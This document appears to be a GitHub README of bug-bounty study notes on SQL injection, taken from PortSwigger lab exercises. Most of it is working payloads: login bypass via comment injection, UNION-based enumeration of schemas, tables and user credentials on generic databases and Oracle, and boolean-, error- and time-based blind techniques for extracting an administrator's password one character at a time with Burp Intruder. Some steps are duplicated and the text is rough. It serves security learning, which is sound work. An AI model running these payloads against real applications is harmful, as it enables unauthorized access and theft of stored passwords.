https://portswigger.net/web-security/sql-injection/cheat-sheet
# SQL-Injection_Bug_Bounty
#All taken fron portswigger lab

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

	https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:

	SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

	https://insecure-website.com/products?category=Gifts'+OR+1=1--
  
	SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
	since 1=1 is always true
Check response:    ‘--      |   #--

**Subverting application logic/Login form:**

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

	SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

![image](https://user-images.githubusercontent.com/37367596/192005023-3f13a816-0a13-4f0a-8ff5-cf85222e8604.png)


**Retrieving data from other database tables/Union attack:**

For a UNION query to work, two key requirements must be met:

 1.The individual queries must return the same number of columns.
 
 2.The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out

 1.How many columns are being returned from the original query?
 
 2.Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
 
**There are two effective methods to determine how many columns are being returned from the original query.**
**The first method** involves injecting a series of** ORDER BY** clauses and incrementing the specified column index until an error occurs.

' ORDER BY 1--

 ' ORDER BY 2-- 
 
' ORDER BY 3--
etc.
![image](https://user-images.githubusercontent.com/37367596/192006415-207e60bb-4977-4895-9a57-43fed4f6c250.png)


The application might actually return the **database error** in its HTTP response, or it might return a **generic error**, or simply return **no results**

**The second method** involves submitting a series of UNION SELECT payloads specifying a different number of null values

' UNION SELECT NULL—

 ' UNION SELECT NULL,NULL—
 
 ' UNION SELECT NULL,NULL,NULL– 

' UNION SELECT NULL FROM DUAL--     (oracale database)

**Finding columns with a useful data type(string/int/or other types) in an SQL injection UNION attack**

' UNION SELECT NULL,NULL,NULL,'a'—

' UNION SELECT NULL,'a',NULL,NULL—

' UNION SELECT username, password(coloumns) FROM users– (table)

![image](https://user-images.githubusercontent.com/37367596/192007589-7f01ddc9-e5a5-40a5-8004-c2c116e0ca55.png)

![image](https://user-images.githubusercontent.com/37367596/192009263-e2ee5bbc-e882-44d2-835a-b46c1b5ad3aa.png)

https://portswigger.net/web-security/sql-injection/cheat-sheet

**Listing the contents of the database:**

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

	SELECT * FROM information_schema.tables
	
**You can then query information_schema.columns to list the columns in individual tables**

	SELECT * FROM information_schema.columns WHERE table_name = 'Users
	
	
 **Use the following payload to retrieve the list of database:**
 
	' UNION select schema_name,NUll from INFORMATION_SCHEMA.SCHEMATA--
	
**2.Use the following payload to retrieve the list of tables in the database:**

	'UNION SELECT table_name,NULL FROM information_schema.tables--
	
schema_name=database;

information_schema=databaseName

**3.Use the following payload (replacing the table name) to retrieve the details of the columns in the table**

 'UNION SELECT column_name ,NULL FROM information_schema.columns WHERE table_name='users_uvlvoo'—

**4. To find information of username and password**

	‘ UNION SELECT username_jovsyx, password_abwqcw FROM users_uvlvoo– 
	
    concate: ' UNION SELECT NULL,username || '---->' || password FROM users--

![image](https://user-images.githubusercontent.com/37367596/192010124-561016c4-f865-469f-9c8d-6f0a388e86b1.png)


 **Equivalent to information schema on Oracle**
 
You can list tables by querying all_tables : SELECT * FROM all_tables

And you can list columns by querying  all_tab_columns  :  SELECT * FROM  all_tab_columns WHERE  table_name = 'USERS‘

1. Use the following payload to retrieve the list of database:

 	 ' UNION SELECT SYS.DATABASE_NAME,NULL FROM DUAL--

2. Use the following payload to retrieve the list of tables in the database:

 	 ‘ UNION SELECT table_name, NULL FROM all_tables--

3.Use the following payload (replacing the table name) to retrieve the details of the columns in the table

  	'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name ='USER$'—

4. To find information of username and password

	‘ UNION SELECT username_jovsyx, password_abwqcw FROM users_uvlvoo– 
![image](https://user-images.githubusercontent.com/37367596/192018303-8d02a8de-68eb-4b8f-9128-696824edfe9a.png)


**Retrieving multiple values within a single column/String concatenation:**

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

	' UNION SELECT username || '~' || password FROM users--
	
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

	administrator~s3cure
 	wiener~peter 
	carlos~montoya
![image](https://user-images.githubusercontent.com/37367596/192021841-f82f5ec7-85de-43be-be16-8aa530cea91a.png)


**Blind SQL injection vulnerabilities**
			
There are two types of blind SQL Injection: **boolean-based** and **time-based.**
This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform

Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:

	1.You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero
	2.You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
	3.You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.
OAST------https://portswigger.net/burp/application-security-testing/oast
![image](https://user-images.githubusercontent.com/37367596/192022482-d3127c33-932f-475d-9bc6-22ae47e05c25.png)


**Exploiting blind SQL injection by triggering conditional responses(Boolean base):**

**1.Confirm that the parameter is vulnerable to Blind Sqli attack:**

	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2'
	
	if this tracking ID exits on database --->welcome messege---> Query return value
	if does't exit ------> Query return nothing

**2.Check True useCase:**

	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' AND 1=1--
	
       	payload: ' AND 1=1--
	TRUE:Welcome Back
	FALSE:Nothing 1=2--(Now we can exploit blind sqli)
	
**3.Confirm that we have a users table:**

 	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' AND (SELECT 'a' from users LIMIT 1)='a'--
 
             payload:' AND (SELECT 'a' from users LIMIT 1)='a'--
				a=any number;LIMIT 1= only for one user
		if return Welcome ----> exits users table


![image](https://user-images.githubusercontent.com/37367596/192023791-f2f08b71-b972-45cc-af8d-c01eea918fbd.png)

**4.Confirm that  username administrator exits on users table:**

	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' AND (SELECT username from users where username='administrator')='administrator'—
	payload:' AND (SELECT username from users where username='administrator')='administrator'--
	administrator user exist…..
	
**5.Enumerate password of the administrator user:**

	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' 
	AND (SELECT username from users where username='administrator' and LENGTH(password)>1)='administrator'--
    To know exect password length use intruder: option--->select pass_length(1)->sniper
					    payload->number->1-50->start attack

4.Confirm that  username administrator exits on users table:
query--->SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' AND (SELECT username from users 			where username='administrator')='administrator'—
	payload:' AND (SELECT username from users where username='administrator')='administrator'--
	administrator user exist…..
5.Enumerate password of the administrator user:
query--->SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' 
	AND (SELECT username from users where username='administrator' and LENGTH(password)>1)='administrator'--
To know exect password length use intruder: option--->select pass_length(1)->sniper
					    payload->number->1-50->start attack

**Guess the 1st charecter of password:**

	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'rEUHIfcKKKWib5b2' 
	AND (SELECT substring(password,1,1)from users where username='administrator')='a'-- 		##(1=1st_cha;1=Only_one_cha)
	
	use Intruder:option->select pass_cha(a)->sniper
		 	   payload->brutefourcer->1-1->start attack
Next find 19 cha::::: intruder(clasterBomber)--->substring(password,1,1)(NUmber) countinue++

				 		 ='a'-(Bruterforcer)

![image](https://user-images.githubusercontent.com/37367596/192025199-24420ed1-0274-4e25-81ea-c0ce2b95b095.png)



![image](https://user-images.githubusercontent.com/37367596/192024565-b2e1fcbb-481d-4e14-8671-a8365354f98b.png)


**Inducing conditional responses by triggering SQL errors:**

**1.Prove that parameter is vulnerable:**

	put single quatation= '--->error
	close the quate=''--->no error
	Check===   ' || (select '') || '
	payload:  ' || (select '' from dual) || ‘ -->oracle database
So,it is vulnerable to sql injection.....

**2.Confirm that we have a users table in the database:**

	paylaod: ' || (select '' from users) || '
		' || (select '' from users where rownum=1) || '  ###show only 1st row
	So, users table exist in database.....

![image](https://user-images.githubusercontent.com/37367596/192025474-4f6eb58f-dd0f-4816-91b9-33936e38106c.png)


**3.Confirm that we have a administrator user in the users database:**

	payload: ' || (select '' from users where username='administrator') || '
				###/this always show right...so need to change something ###/
		'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
				###/(1=1)Error (1=0)Ok...TO_CHAR-convert string to number in oracle ###/
	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'
	
	EVALUTION::First run FROM clause, then SELECT clause....
		   If administrator exist, then run (1=1) and give an error
			 500 Internal Server Error-----so, administrator user exist.......
			 
**4.Determine the length of password:**

	payload:'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1)||'
		EVALUTION::If return False/500 Internal Server Error, then payload is okkkk
				if return OK/200 , then payload is false
	we can know exect length of password using intruder.....

![image](https://user-images.githubusercontent.com/37367596/192025989-f0c792fd-d3f4-44e5-8d98-9c26f295c229.png)


**5.Determine the password:**

	payload:'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,1,1)='a')||'
		EVALUTION::If got 200/ok, then 'a'is not first character...
				if get error/500, then 'a'is 1st character....
	use intruder to know the result...... 
![image](https://user-images.githubusercontent.com/37367596/192026124-daaf48e1-0f16-4c48-82b0-4b29dda6003e.png)


**Exploiting blind SQL injection by triggering time delays(time based):**

	select tracking_id from tracking_table where trackingID='shjfhsjf' || (select sleep(10))--';
	Payload:: ' || (SELECT SLEEP(10))—
	
**1.Confirm that parameter is vulnerable:**

	paylaod:' || (SELECT pg_sleep(10))--
		' || pg_sleep(10)--
		
**2.Confirm that users table exist on database:**

	' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
	' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
	
**3.Enumerating password length:**

	payload: ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--

**4.Find password:**

	payload: ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
![Uploading image.png…]()














	
	

	






